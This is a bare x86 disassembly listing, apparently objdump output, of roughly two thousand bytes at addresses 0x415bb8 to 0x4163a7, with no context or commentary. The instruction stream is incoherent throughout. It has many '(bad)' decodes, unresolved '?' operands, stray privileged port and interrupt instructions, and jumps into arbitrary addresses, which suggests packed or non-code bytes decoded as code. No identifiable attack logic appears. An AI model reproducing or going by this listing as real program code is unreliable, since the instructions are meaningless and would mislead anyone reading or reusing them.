  415bb8:	xchg   ebp,eax
  415bb9:	out    dx,al
  415bba:	cmp    eax,0x5a
  415bbd:	xlat   BYTE PTR ds:[ebx]
  415bbe:	xchg   BYTE PTR [edx*4+0x1534eaf5],dh
  415bc5:	ds push edx
  415bc7:	jg     0x415bd4
  415bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bca:	aad    0xfb
  415bcc:	mov    BYTE PTR [ecx+0x6f549eaa],ah
  415bd2:	push   esp
  415bd3:	mov    edx,DWORD PTR [edx+0x55]
  415bd6:	test   al,0x5d
  415bd8:	repz ficomp DWORD PTR [ecx+0x7c1ca555]
  415bdf:	cmp    ch,ah
  415be1:	popf   
  415be2:	into   
  415be3:	xor    DWORD PTR [ebx+0x30],ecx
  415be6:	pop    edi
  415be7:	ret    0x24bd
  415bea:	std    
  415beb:	ins    DWORD PTR es:[edi],dx
  415bec:	jns    0x415c6b
  415bee:	add    eax,0x93798d77
  415bf3:	adc    al,0x3
  415bf5:	ss int3 
  415bf7:	ins    BYTE PTR es:[edi],dx
  415bf8:	mov    ds:0x38432035,eax
  415bfd:	jmp    0x415c0d
  415bff:	inc    ebp
  415c00:	fbld   TBYTE PTR [eax]
  415c02:	mov    ?,esp
  415c04:	mov    eax,DWORD PTR [ebp+0x28]
  415c07:	adc    eax,0x6ae5b280
  415c0c:	lock mov esp,DWORD PTR [edx+0x5f]
  415c10:	test   DWORD PTR [ebp+0x60],esi
  415c13:	push   edi
  415c14:	out    0x97,eax
  415c16:	sub    BYTE PTR [ebp+ecx*8-0x4f],0xe
  415c1b:	loopne 0x415c80
  415c1d:	and    edx,DWORD PTR [ebx-0x39f15992]
  415c23:	sub    dl,BYTE PTR [edx+edx*8+0x4c]
  415c27:	pop    ds
  415c28:	pop    esp
  415c29:	call   FWORD PTR [ebx+0x608ba2c2]
  415c2f:	mov    cl,0x2d
  415c31:	arpl   WORD PTR [ebp+0x72],cx
  415c34:	xlat   BYTE PTR ds:[ebx]
  415c35:	fisub  DWORD PTR [ecx+0x17e62125]
  415c3b:	dec    edx
  415c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c3d:	icebp  
  415c3e:	addr16 push ecx
  415c40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c41:	xchg   ecx,eax
  415c42:	mov    ds:0xe8fd6dc,eax
  415c47:	push   ebp
  415c48:	and    ebx,DWORD PTR [edx+0x5e]
  415c4b:	mov    dh,0x48
  415c4d:	arpl   bx,di
  415c4f:	jmp    0x23e4154f
  415c54:	(bad)  
  415c55:	jmp    0x415c28
  415c57:	cvtps2pi mm7,QWORD PTR es:[edx]
  415c5b:	inc    ebp
  415c5c:	jp     0x415bfe
  415c5e:	pop    ebp
  415c5f:	enter  0x19,0xef
  415c63:	jmp    0x39ffa596
  415c68:	pop    edi
  415c69:	scas   al,BYTE PTR es:[edi]
  415c6a:	dec    ecx
  415c6b:	pop    ss
  415c6c:	add    al,0x6c
  415c6e:	(bad)  
  415c6f:	pop    si
  415c71:	mov    bh,0x4a
  415c73:	jnp    0x415c6a
  415c75:	pusha  
  415c76:	loop   0x415c0e
  415c78:	fucomi st,st(1)
  415c7a:	rcl    DWORD PTR [esi],cl
  415c7c:	das    
  415c7d:	or     al,0xe9
  415c7f:	pop    ds
  415c80:	add    al,0xcc
  415c82:	inc    esp
  415c83:	dec    eax
  415c84:	stc    
  415c85:	fstp   DWORD PTR [eax+esi*8+0x5db64fa1]
  415c8c:	test   eax,0xaf08da83
  415c91:	and    al,0x86
  415c93:	int    0x9d
  415c95:	inc    edi
  415c96:	sahf   
  415c97:	ror    DWORD PTR [ecx],cl
  415c99:	mov    eax,ds:0x53dcdb1a
  415c9e:	fisub  DWORD PTR [ecx+0x73317203]
  415ca4:	jp     0x415c80
  415ca6:	or     bl,BYTE PTR [edx-0x48]
  415ca9:	or     BYTE PTR [ecx+0x18794bfb],bl
  415caf:	mov    al,ds:0x432d7110
  415cb4:	ror    bh,1
  415cb6:	xor    ebx,DWORD PTR [ebx-0x3fc31293]
  415cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cbd:	sbb    ch,BYTE PTR [esi+esi*1-0x50433314]
  415cc4:	and    ecx,edi
  415cc6:	lods   al,BYTE PTR ds:[esi]
  415cc7:	pop    ds
  415cc8:	int    0x4e
  415cca:	xor    BYTE PTR [ebp+0x6c9164a0],ch
  415cd0:	mov    ch,0xa1
  415cd2:	dec    ebp
  415cd3:	dec    ebp
  415cd4:	(bad)  [ebx+0x3e]
  415cd7:	stos   BYTE PTR es:[edi],al
  415cd8:	ss push ecx
  415cda:	jnp    0x415c6f
  415cdc:	in     al,0x97
  415cde:	cwde   
  415cdf:	ja     0x415d58
  415ce1:	iret   
  415ce2:	pop    esi
  415ce3:	cmp    ch,ah
  415ce5:	sbb    ebx,DWORD PTR [edi+0x41c63d1a]
  415ceb:	popa   
  415cec:	retf   
  415ced:	mov    eax,ds:0x6851e7c1
  415cf2:	ss add eax,0x5b286734
  415cf8:	pop    DWORD PTR [eax+0x3a]
  415cfb:	push   DWORD PTR [ebp-0x66]
  415cfe:	stos   BYTE PTR es:[edi],al
  415cff:	sub    ah,0x1d
  415d02:	repz jno 0x415cd5
  415d05:	jae    0x415d02
  415d07:	pusha  
  415d08:	adc    esp,DWORD PTR [edx-0x55]
  415d0b:	(bad)  
  415d0d:	pushf  
  415d0e:	sbb    eax,ecx
  415d10:	test   DWORD PTR [eax],edx
  415d12:	push   ebp
  415d13:	outs   dx,DWORD PTR ds:[si]
  415d15:	mov    ebx,DWORD PTR [edi-0x70]
  415d18:	fsubr  QWORD PTR [ecx+0x6bd83bd8]
  415d1e:	push   esi
  415d1f:	adc    eax,0xef2911d4
  415d24:	mov    ah,0xdc
  415d26:	or     DWORD PTR [ebx],0x728ad325
  415d2c:	sub    al,ah
  415d2e:	ror    eax,1
  415d30:	xchg   edx,eax
  415d31:	add    eax,0x7ff719e
  415d36:	pop    esp
  415d37:	call   0x6dae8b0f
  415d3c:	add    al,0x3d
  415d3e:	mov    bl,0xd3
  415d40:	push   ecx
  415d41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d42:	xor    DWORD PTR ds:0x96ef0105,eax
  415d48:	icebp  
  415d49:	adc    eax,esi
  415d4b:	call   0x339c:0x22076317
  415d52:	add    eax,0xed63b3b8
  415d57:	fimul  WORD PTR [eax]
  415d59:	js     0x415d0a
  415d5b:	daa    
  415d5c:	push   ebx
  415d5d:	addr16 push 0xb9632377
  415d63:	xor    esi,edi
  415d65:	xchg   BYTE PTR [ebp+0x6f49007f],ah
  415d6b:	sub    bh,BYTE PTR ds:[ecx+0x52d1f8cf]
  415d72:	repnz xor bh,ah
  415d75:	mov    dl,0x20
  415d77:	mov    al,ds:0xd2985f0a
  415d7c:	pop    ds
  415d7d:	lods   al,BYTE PTR ds:[esi]
  415d7e:	aas    
  415d7f:	mov    esi,0xc97e2f3d
  415d84:	arpl   WORD PTR [esp+eax*2],bx
  415d87:	pop    edx
  415d88:	mov    al,0xb
  415d8a:	sar    DWORD PTR [ecx+eiz*2+0x69],0xb1
  415d8f:	dec    ecx
  415d91:	pop    edx
  415d92:	pop    ebp
  415d93:	xor    BYTE PTR [edi],ch
  415d95:	out    0x34,eax
  415d97:	ins    BYTE PTR es:[edi],dx
  415d98:	pop    eax
  415d99:	cwde   
  415d9a:	lods   eax,DWORD PTR ds:[esi]
  415d9b:	jns    0x415d65
  415d9d:	inc    esp
  415d9e:	stos   DWORD PTR es:[edi],eax
  415d9f:	popa   
  415da0:	scas   al,BYTE PTR es:[edi]
  415da1:	jnp    0x415def
  415da3:	pusha  
  415da4:	xchg   ebp,eax
  415da5:	mov    edi,0x4bf32083
  415daa:	pop    esp
  415dab:	jg     0x415dee
  415dad:	xchg   edi,eax
  415dae:	fs mov ch,0xe2
  415db1:	not    BYTE PTR [ecx+0x48]
  415db4:	sub    BYTE PTR [eax+ecx*8],bh
  415db7:	inc    ecx
  415db8:	xor    eax,0x6e2bf566
  415dbd:	clc    
  415dbe:	push   esi
  415dbf:	sbb    dl,ch
  415dc1:	lods   eax,DWORD PTR ds:[esi]
  415dc2:	push   ds
  415dc3:	fbld   TBYTE PTR [esi+0x5ce55ad4]
  415dc9:	jo     0x415e02
  415dcb:	dec    eax
  415dcc:	jle    0x415dd0
  415dce:	jnp    0x415e3f
  415dd0:	pop    edi
  415dd1:	aas    
  415dd2:	out    dx,al
  415dd3:	xchg   esi,eax
  415dd4:	sti    
  415dd5:	and    BYTE PTR [eax+0x7785da81],al
  415ddb:	inc    esi
  415ddc:	cli    
  415ddd:	cmp    al,0x53
  415ddf:	scas   al,BYTE PTR es:[edi]
  415de0:	mov    ds:0x26ac410f,eax
  415de5:	cli    
  415de6:	xor    BYTE PTR [esi],dl
  415de8:	loop   0x415d76
  415dea:	pop    edx
  415deb:	xor    eax,0xfaa4f02d
  415df0:	add    ah,BYTE PTR [edi-0x5cdfcb3d]
  415df6:	bound  esp,QWORD PTR ds:0x6b590536
  415dfc:	dec    ecx
  415dfd:	add    al,0x18
  415dff:	inc    ebx
  415e00:	lahf   
  415e01:	jmp    0x2027:0x62559f5f
  415e08:	stos   BYTE PTR es:[edi],al
  415e09:	or     DWORD PTR [ebx+0x7975be9d],0xfffffff8
  415e10:	rol    BYTE PTR [ecx+0x3c],1
  415e13:	popa   
  415e14:	xor    eax,0x74d58fa1
  415e19:	mov    esi,0xbc30e588
  415e1e:	arpl   WORD PTR [ecx+0x4f],si
  415e21:	adc    BYTE PTR [ebp+0x2c1544e],ah
  415e27:	stos   BYTE PTR es:[edi],al
  415e28:	retf   
  415e29:	shr    BYTE PTR [ecx],cl
  415e2b:	into   
  415e2c:	jmp    0xe6dd:0x685e4ecc
  415e33:	bound  eax,QWORD PTR [ebx]
  415e35:	xor    DWORD PTR [ecx+0xb],eax
  415e38:	mov    edi,0xd19b9330
  415e3d:	xchg   ebx,ecx
  415e3f:	cmp    al,0x85
  415e41:	push   edx
  415e42:	pop    ecx
  415e43:	test   dh,al
  415e45:	mov    edx,0x36da09cc
  415e4a:	add    bl,dl
  415e4c:	sbb    DWORD PTR [edi+edi*1+0x51],ebp
  415e50:	call   0x41540bb2
  415e55:	sbb    bh,BYTE PTR [eax-0x4934a533]
  415e5b:	leave  
  415e5c:	ret    0x92aa
  415e5f:	js     0x415e35
  415e61:	add    al,0xa
  415e63:	(bad)  
  415e64:	outs   dx,BYTE PTR ds:[esi]
  415e65:	mov    cl,al
  415e67:	rol    ch,0xf1
  415e6a:	cmp    BYTE PTR [esi],dl
  415e6c:	jge    0x415e65
  415e6e:	push   ecx
  415e6f:	mov    ebx,0xc688076d
  415e74:	xlat   BYTE PTR ds:[ebx]
  415e75:	lods   eax,DWORD PTR ds:[esi]
  415e76:	jmp    0x415ef3
  415e78:	mov    ecx,0x3cb818c4
  415e7d:	mov    ah,0xea
  415e7f:	test   cl,bh
  415e81:	je     0x415e34
  415e83:	sbb    BYTE PTR [ebp+edi*8+0x7e],dl
  415e87:	sbb    eax,0xb1623ce2
  415e8c:	stc    
  415e8d:	lea    edx,[esi+0x21]
  415e90:	add    al,0x4
  415e92:	out    dx,eax
  415e93:	fstp   QWORD PTR [ebx]
  415e95:	jns    0x415e1c
  415e97:	xor    al,0x6c
  415e99:	add    BYTE PTR [ecx+0x50474dd4],ch
  415e9f:	jns    0x415e7c
  415ea1:	out    0x77,eax
  415ea3:	xchg   esp,eax
  415ea4:	outs   dx,WORD PTR ds:[esi]
  415ea6:	rcl    esi,0x7c
  415ea9:	cdq    
  415eaa:	mov    al,0x6e
  415eac:	xchg   esi,eax
  415ead:	push   ebp
  415eae:	out    0x7e,eax
  415eb0:	jo     0x415e68
  415eb2:	jno    0x415e85
  415eb4:	add    BYTE PTR [ebp-0x27],cl
  415eb7:	fmul   QWORD PTR [ebp+0x3d]
  415eba:	jae    0x415ea6
  415ebc:	mov    edx,0x7c24c719
  415ec1:	and    eax,0x6d9cea43
  415ec6:	mov    esi,0x7c2e60f4
  415ecb:	xor    DWORD PTR [edi],0xf
  415ece:	xchg   edi,esi
  415ed0:	xor    bh,0xfe
  415ed3:	sbb    eax,0x2879cb2f
  415ed8:	lock ror DWORD PTR [edi+0x2313f6f4],cl
  415edf:	stos   BYTE PTR es:[edi],al
  415ee0:	int    0x32
  415ee2:	xor    BYTE PTR [eax-0x37416a72],al
  415ee8:	into   
  415ee9:	sub    ah,BYTE PTR [edx-0x6a18108a]
  415eef:	cmc    
  415ef0:	mov    bl,0xd2
  415ef2:	pmaxub mm6,QWORD PTR [esi]
  415ef5:	add    ebp,DWORD PTR [esi+0x47371e94]
  415efb:	les    ebp,FWORD PTR [edi+0x5f]
  415efe:	mov    edi,0x7d92bb07
  415f03:	xchg   esp,eax
  415f04:	pop    edx
  415f05:	(bad)  
  415f06:	data16 cmp cl,BYTE PTR [ecx+ebx*4-0x41da0f0d]
  415f0e:	xlat   BYTE PTR ds:[ebx]
  415f0f:	cmc    
  415f10:	push   ds
  415f11:	das    
  415f12:	or     eax,0xca63b391
  415f17:	fld    QWORD PTR [ecx]
  415f19:	pusha  
  415f1a:	jnp    0x415f98
  415f1c:	xlat   BYTE PTR ds:[ebx]
  415f1d:	adc    BYTE PTR [ebx+edi*1],ch
  415f20:	scas   al,BYTE PTR es:[edi]
  415f21:	hlt    
  415f22:	repz shl DWORD PTR [ebx-0x34],1
  415f26:	(bad)  
  415f27:	mov    eax,0xb4725d75
  415f2c:	lds    ebp,FWORD PTR [ecx]
  415f2e:	sbb    DWORD PTR [eax-0x52],edi
  415f31:	dec    esp
  415f33:	jb     0x415fac
  415f35:	sub    edi,DWORD PTR [ecx-0x40]
  415f38:	add    ecx,ebp
  415f3a:	push   ss
  415f3b:	je     0x415f17
  415f3d:	push   edi
  415f3e:	dec    BYTE PTR [eax-0x6e]
  415f41:	mov    dh,0x3
  415f43:	cld    
  415f44:	jne    0x415eff
  415f46:	mov    edi,ebx
  415f48:	add    BYTE PTR [esi*4-0x475c1b8],0x97
  415f50:	jecxz  0x415f4e
  415f52:	jg     0x415f3d
  415f54:	push   0x8e6be037
  415f59:	pushf  
  415f5a:	pop    edi
  415f5b:	sbb    eax,0x10b1ee26
  415f60:	in     eax,0x18
  415f62:	hlt    
  415f63:	loop   0x415eeb
  415f65:	fistp  QWORD PTR [ebx-0x9]
  415f68:	fstp   QWORD PTR [ebx-0x57]
  415f6b:	push   0x2a
  415f6d:	add    eax,0xef426019
  415f72:	push   esp
  415f73:	and    eax,0x70885e70
  415f78:	pop    esi
  415f79:	jp     0x415f64
  415f7b:	push   ecx
  415f7c:	pop    eax
  415f7d:	ret    
  415f7e:	in     al,dx
  415f7f:	fnstcw WORD PTR [edi-0x107f5104]
  415f85:	cs mov dl,0x50
  415f88:	pushfw 
  415f8a:	mov    WORD PTR [edi*1+0x43a82c23],cs
  415f91:	sub    al,0x56
  415f93:	scas   eax,DWORD PTR es:[edi]
  415f94:	xchg   ebp,eax
  415f95:	sbb    dl,dl
  415f97:	ss ds cdq 
  415f9a:	sub    al,BYTE PTR [ebp+0x6c]
  415f9d:	int3   
  415f9e:	cmp    bl,BYTE PTR [edx+edx*2-0x762cb417]
  415fa5:	in     eax,dx
  415fa6:	pop    es
  415fa7:	fs call 0x1f9150dd
  415fad:	dec    esp
  415fae:	and    dl,bl
  415fb0:	jmp    0xf077997b
  415fb5:	(bad)  
  415fb6:	(bad)  
  415fb7:	sbb    eax,0x48c93a25
  415fbc:	in     al,0x75
  415fbe:	cmp    bl,ch
  415fc0:	hlt    
  415fc1:	inc    edx
  415fc2:	push   ss
  415fc3:	xor    eax,0x18a05a2a
  415fc8:	(bad)  
  415fc9:	aaa    
  415fca:	and    BYTE PTR [ebp+0x7043ec63],0x21
  415fd1:	iret   
  415fd2:	ins    DWORD PTR es:[edi],dx
  415fd3:	and    ch,BYTE PTR [ebp-0x3cd753a6]
  415fd9:	cmp    al,0x20
  415fdb:	fmul   QWORD PTR [edi-0x6a]
  415fde:	dec    ebx
  415fdf:	xchg   esi,eax
  415fe0:	rol    DWORD PTR [ebx+ebx*1+0x6afe2792],1
  415fe7:	cmp    al,0x6b
  415fe9:	pusha  
  415fea:	xlat   BYTE PTR ds:[ebx]
  415feb:	jg     0x415fd1
  415fed:	add    al,0xa1
  415fef:	enter  0x7e6,0x81
  415ff3:	mov    dh,0x6b
  415ff5:	aas    
  415ff6:	jp     0x415f8a
  415ff8:	mov    edi,0x66ea63fd
  415ffd:	inc    ebp
  415ffe:	push   esi
  415fff:	mov    ?,edx
  416001:	dec    ebp
  416002:	mov    ah,0x49
  416004:	dec    eax
  416005:	(bad)  
  416006:	test   al,0x13
  416008:	test   edx,ebp
  41600a:	dec    edi
  41600b:	rol    BYTE PTR [edi],cl
  41600d:	mov    edi,0x5f77ece
  416012:	jns    0x415fee
  416014:	rcr    BYTE PTR [esi],cl
  416016:	mov    eax,ds:0x5bfe64e7
  41601b:	les    edx,FWORD PTR [esi]
  41601d:	mov    dl,0x12
  41601f:	ror    bh,0x60
  416022:	retf   
  416023:	fnstsw WORD PTR [eax+0x5ff91e66]
  416029:	sub    eax,0x6891dc5a
  41602e:	adc    edx,DWORD PTR [edx+0x316e6e8b]
  416034:	mov    bh,0x68
  416036:	dec    esi
  416037:	pop    es
  416038:	mov    edx,0x509db305
  41603d:	loopne 0x415fce
  41603f:	fistp  DWORD PTR [ebp-0x15]
  416042:	pushf  
  416043:	push   ebx
  416044:	mov    bh,0xc0
  416046:	jb     0x416095
  416048:	call   0x2ef7e837
  41604d:	or     BYTE PTR [ebx+0x48efe608],bh
  416053:	jne    0x416052
  416055:	je     0x416054
  416057:	pop    ss
  416058:	lock cmp cl,BYTE PTR [ebp+0x15]
  41605c:	scas   eax,DWORD PTR es:[edi]
  41605d:	mov    ecx,0xb6a6cda0
  416062:	pusha  
  416063:	inc    ebx
  416064:	push   ecx
  416065:	or     al,0xa1
  416067:	mov    esp,0x3134911d
  41606c:	rcr    eax,0x97
  41606f:	ss jp  0x41604f
  416072:	repnz mov ah,0xd2
  416075:	mov    eax,ds:0x47174e3e
  41607a:	mov    ds:0x93c5121e,eax
  41607f:	pop    es
  416080:	popa   
  416081:	sub    al,0x93
  416083:	mov    ch,0xeb
  416085:	adc    DWORD PTR [edx],0xffffffae
  416088:	xchg   ebp,eax
  416089:	and    DWORD PTR [edx],esi
  41608b:	mov    ebx,0x479d62a0
  416090:	loope  0x4160b8
  416092:	mov    esi,0xbe497828
  416097:	mov    al,0x30
  416099:	xchg   esi,eax
  41609a:	aam    0x33
  41609c:	pop    ss
  41609d:	shr    BYTE PTR [edx+0x75],0x60
  4160a1:	js     0x416103
  4160a3:	mov    ss,WORD PTR [ebx]
  4160a5:	pop    es
  4160a6:	test   eax,0x1cad1d3c
  4160ab:	add    edx,DWORD PTR [ebx]
  4160ad:	xchg   BYTE PTR [ebx],dh
  4160af:	sub    eax,0x39bf404
  4160b4:	mov    ?,WORD PTR [ecx]
  4160b6:	outs   dx,DWORD PTR es:[esi]
  4160b8:	and    DWORD PTR [ebp+ecx*2-0x41],esp
  4160bc:	mov    eax,ds:0xfe0370a9
  4160c1:	mov    dl,0xfc
  4160c3:	fnsave [ebx]
  4160c5:	jne    0x4160b4
  4160c7:	mov    WORD PTR [eax+0x62],?
  4160ca:	jle    0x41605a
  4160cc:	jmp    0x416090
  4160ce:	mov    al,BYTE PTR [edi*8-0x42fa6de7]
  4160d5:	mov    eax,ds:0x8129eaa5
  4160da:	dec    ebx
  4160db:	repnz int 0x30
  4160de:	scas   al,BYTE PTR es:[edi]
  4160df:	lods   al,BYTE PTR ds:[esi]
  4160e0:	mov    eax,0x1e87deee
  4160e5:	dec    ebx
  4160e6:	mov    edi,ebp
  4160e8:	mov    al,0x77
  4160ea:	mov    ebp,0xa0ac6891
  4160ef:	or     DWORD PTR [edx+eiz*4+0x56fb3543],ecx
  4160f6:	adc    BYTE PTR ds:0x7e321baf,dl
  4160fc:	xchg   ebx,eax
  4160fd:	push   ebp
  4160fe:	jo     0x41613f
  416100:	dec    ecx
  416101:	daa    
  416102:	pop    ss
  416103:	jb     0xc134e00a
  416109:	call   0x8e9a:0x723cd864
  416110:	and    al,0x72
  416112:	jle    0x416140
  416114:	cmc    
  416115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416116:	pop    ebx
  416117:	push   0x69
  416119:	dec    edi
  41611a:	inc    ebx
  41611b:	xor    bl,ch
  41611d:	call   0xe3fea4dc
  416122:	sbb    DWORD PTR [ebx+0x7f3e52a7],esp
  416128:	mov    DWORD PTR [ecx],0x36b0bcb4
  41612e:	aad    0x39
  416130:	pop    ebp
  416131:	adc    cl,ah
  416133:	cmp    cl,bh
  416135:	xchg   DWORD PTR [ecx],ebp
  416137:	jmp    DWORD PTR [ebx-0x149a7e4e]
  41613d:	pop    esp
  41613e:	jg     0x4161b4
  416140:	mov    WORD PTR [ecx*1+0x62a862c5],es
  416147:	fst    DWORD PTR [edi+0x5b]
  41614a:	(bad)  
  41614b:	stc    
  41614c:	stc    
  41614d:	xor    DWORD PTR [ebx-0x72],ebp
  416150:	dec    ecx
  416151:	pop    es
  416152:	xchg   ecx,eax
  416153:	ss in  al,dx
  416155:	adc    eax,0x4b646930
  41615a:	mov    edx,0xe8b4ee8f
  41615f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416160:	sub    DWORD PTR [edx],eax
  416162:	sbb    BYTE PTR ds:0x8c606523,ch
  416168:	dec    ebp
  416169:	mul    esi
  41616b:	(bad)  
  41616c:	popf   
  41616d:	dec    ebx
  41616e:	ret    
  41616f:	pop    sp
  416171:	adc    al,0xa3
  416173:	mov    cl,0xcf
  416175:	push   cs
  416176:	inc    edx
  416177:	inc    ecx
  416178:	aad    0x5a
  41617a:	and    BYTE PTR [ecx+0x39],0xd
  41617e:	jno    0x41613f
  416180:	into   
  416181:	dec    edx
  416182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416183:	or     eax,0x4a9ff061
  416188:	push   esi
  416189:	loope  0x416169
  41618b:	xor    eax,0x7d7a54f5
  416190:	cmp    al,0xea
  416192:	xchg   esi,eax
  416193:	je     0x4161ea
  416195:	test   al,0x82
  416197:	pop    ebx
  416198:	aas    
  416199:	push   0xffffffe9
  41619b:	mov    DWORD PTR [ebp-0x71],esp
  41619e:	out    0xb,eax
  4161a0:	xor    DWORD PTR [edi+0x75],ebp
  4161a3:	xor    esp,ebx
  4161a5:	and    DWORD PTR [edx+edi*2],ebx
  4161a8:	(bad)  
  4161a9:	adc    BYTE PTR [edx+0x49922de6],dh
  4161af:	out    0x7c,al
  4161b1:	outs   dx,DWORD PTR ds:[esi]
  4161b2:	iret   
  4161b3:	dec    ebp
  4161b4:	jg     0x4161f6
  4161b6:	mov    eax,0x29ca36a7
  4161bb:	mov    al,ds:0xfc60791c
  4161c0:	gs jbe 0x41621e
  4161c3:	ret    
  4161c4:	or     DWORD PTR [edx+0x6da81757],ebp
  4161ca:	nop
  4161cb:	ins    DWORD PTR es:[edi],dx
  4161cc:	adc    al,0xbe
  4161ce:	rol    DWORD PTR [eax-0xf],cl
  4161d1:	sub    DWORD PTR [edi],0x6156349f
  4161d7:	xchg   edx,eax
  4161d8:	mov    ecx,0x3f2f619f
  4161dd:	sbb    DWORD PTR [edi],ebx
  4161df:	inc    edx
  4161e0:	cwde   
  4161e1:	shl    DWORD PTR [ecx+0x586ee24d],cl
  4161e7:	popf   
  4161e8:	hlt    
  4161e9:	mov    esp,0xfd46b5d9
  4161ee:	adc    al,BYTE PTR [edx+esi*1]
  4161f1:	cwde   
  4161f2:	pushf  
  4161f3:	test   eax,0x62585a3e
  4161f8:	cld    
  4161f9:	adc    edi,DWORD PTR [esi-0x1f3e850a]
  4161ff:	test   al,0xc7
  416201:	out    0x9f,eax
  416203:	in     eax,0xc4
  416205:	or     BYTE PTR [edi],al
  416207:	push   edx
  416208:	add    dh,BYTE PTR [ebx-0x511000c2]
  41620e:	xor    al,0xf8
  416210:	sub    DWORD PTR [esi+0x28c7673b],eax
  416216:	test   al,0x7a
  416218:	fst    QWORD PTR [ecx+ebx*2-0x7e54c0]
  41621f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416220:	ret    0x6ef8
  416223:	call   0xdbca:0xa4a5a738
  41622a:	mov    ebp,0x57f374d6
  41622f:	push   eax
  416230:	add    DWORD PTR [eax+0x2dca350b],eax
  416236:	add    eax,0x725af2e3
  41623b:	pop    ds
  41623c:	dec    edx
  41623d:	lods   eax,DWORD PTR ds:[esi]
  41623e:	and    ch,bh
  416240:	adc    eax,0xd955bbfa
  416245:	stos   BYTE PTR es:[edi],al
  416246:	adc    BYTE PTR [esi],ah
  416248:	and    al,0xdf
  41624a:	hlt    
  41624b:	xchg   ecx,eax
  41624c:	dec    esi
  41624d:	fucom  st(3)
  41624f:	push   esp
  416250:	in     al,0x96
  416252:	lods   al,BYTE PTR ds:[esi]
  416253:	xor    DWORD PTR [ebp+0x34],ecx
  416256:	mov    dh,0xe4
  416258:	imul   edx,DWORD PTR [ecx],0xffffffce
  41625b:	(bad)  
  41625c:	mov    dl,0xb4
  41625e:	jp     0x416234
  416260:	adc    BYTE PTR [esi],0x7d
  416263:	push   ds
  416264:	pop    edx
  416265:	out    0x43,eax
  416267:	pusha  
  416268:	xor    BYTE PTR [esi+0x43e1c6a0],bh
  41626e:	xor    eax,0xec8165fe
  416273:	fs inc ebx
  416275:	adc    dl,bh
  416277:	push   ss
  416278:	adc    bl,ch
  41627a:	popf   
  41627b:	outs   dx,DWORD PTR ds:[esi]
  41627c:	xchg   ebp,eax
  41627d:	xchg   BYTE PTR [ebx-0x1bf35a96],cl
  416283:	mov    DWORD PTR [eax+0x6f],ebx
  416286:	cmp    dl,BYTE PTR [eax+0x6cbd21e2]
  41628c:	sub    al,BYTE PTR [esi+0x5ce23687]
  416292:	cmp    al,bh
  416294:	into   
  416295:	loope  0x4162ee
  416297:	dec    edx
  416298:	mov    edi,0xf016294b
  41629d:	jl     0x41627b
  41629f:	sub    bh,BYTE PTR [edi]
  4162a1:	out    0xe7,eax
  4162a3:	lds    esi,FWORD PTR [eax]
  4162a5:	cld    
  4162a6:	int    0xc4
  4162a8:	dec    ebp
  4162a9:	mov    al,0x43
  4162ab:	imul   BYTE PTR [esi-0x4a1f13a3]
  4162b1:	hlt    
  4162b2:	mov    dl,0xcd
  4162b4:	sbb    edx,esi
  4162b6:	cs jne 0x4162ca
  4162b9:	imul   eax,DWORD PTR [ebp+0x30b83259],0x8acb026e
  4162c3:	jl     0x4162a3
  4162c5:	push   eax
  4162c6:	mov    bl,0x1f
  4162c8:	sbb    BYTE PTR [ebx],0xed
  4162cb:	xor    BYTE PTR [edx-0x76c5e448],ah
  4162d1:	pavgb  mm4,QWORD PTR [esi]
  4162d4:	lods   eax,DWORD PTR ds:[esi]
  4162d5:	ficomp WORD PTR [edx+0x26]
  4162d8:	mov    dh,0xed
  4162da:	sbb    dl,BYTE PTR [esi+0x67]
  4162dd:	xor    BYTE PTR [edi+0x67],0xbf
  4162e1:	ds push es
  4162e3:	aad    0x1c
  4162e5:	adc    eax,0xf83b366a
  4162ea:	xlat   BYTE PTR ds:[ebx]
  4162eb:	inc    edi
  4162ec:	sbb    DWORD PTR [esi],edx
  4162ee:	mov    ds:0x7ca1f112,eax
  4162f3:	mov    edi,0x9d52d4f2
  4162f8:	clc    
  4162f9:	dec    edx
  4162fa:	xor    edi,esi
  4162fc:	jge    0x4162ff
  4162fe:	popa   
  4162ff:	xchg   BYTE PTR [esi+ebp*8+0x1ed20196],dh
  416306:	aas    
  416307:	pop    ds
  416308:	gs out 0xaf,eax
  41630b:	stc    
  41630c:	jnp    0x4162ce
  41630e:	ss mov ebx,0x2cd7e5ac
  416314:	es inc eax
  416316:	cmp    eax,0x915ab50f
  41631b:	pop    ebx
  41631c:	retf   
  41631d:	addr16 dec ecx
  41631f:	int3   
  416320:	jb     0x416338
  416322:	pop    ds
  416323:	das    
  416324:	pop    edx
  416325:	push   edi
  416326:	mov    dl,0x8
  416328:	retf   
  416329:	ja     0x4162c7
  41632b:	fimul  DWORD PTR [edx+0x347fe0d0]
  416331:	and    BYTE PTR [ecx],cl
  416333:	mov    eax,ds:0x825335aa
  416338:	popa   
  416339:	sub    eax,0x878dbb79
  41633e:	mov    ebx,0x172bff6a
  416343:	inc    esp
  416344:	loopne 0x416363
  416346:	scas   al,BYTE PTR es:[edi]
  416347:	inc    esi
  416348:	enter  0x36fe,0x2d
  41634c:	ret    0x6db5
  41634f:	push   0x78c6b36e
  416354:	lock jmp 0x5a4bb162
  41635a:	mov    ah,0x66
  41635c:	call   0xf097:0x4187d62f
  416363:	inc    esp
  416364:	ds push 0x664f8c19
  41636a:	je     0x4163d4
  41636c:	jmp    0x751d7a88
  416371:	ja     0x416366
  416373:	and    eax,esp
  416375:	(bad)  [edx]
  416377:	mov    ds:0xcb002ec2,eax
  41637c:	lods   eax,DWORD PTR ds:[esi]
  41637d:	xchg   ebp,eax
  41637e:	(bad)  
  41637f:	jae    0x4163ce
  416381:	fcmovnb st,st(0)
  416383:	pop    esi
  416384:	inc    esp
  416385:	push   ds
  416386:	imul   esi,DWORD PTR ds:0x9ae62efb,0x4a
  41638d:	imul   ebp,DWORD PTR [ecx+eiz*2-0x2807b282],0x35ddd93b
  416398:	mov    edx,0x7814a746
  41639d:	push   esi
  41639e:	xchg   edx,eax
  41639f:	dec    ebx
  4163a0:	jecxz  0x416401
  4163a2:	mov    ecx,0xb484f76e
  4163a7:	mov    cs,WORD PTR [ebp+0x45cc53a8]
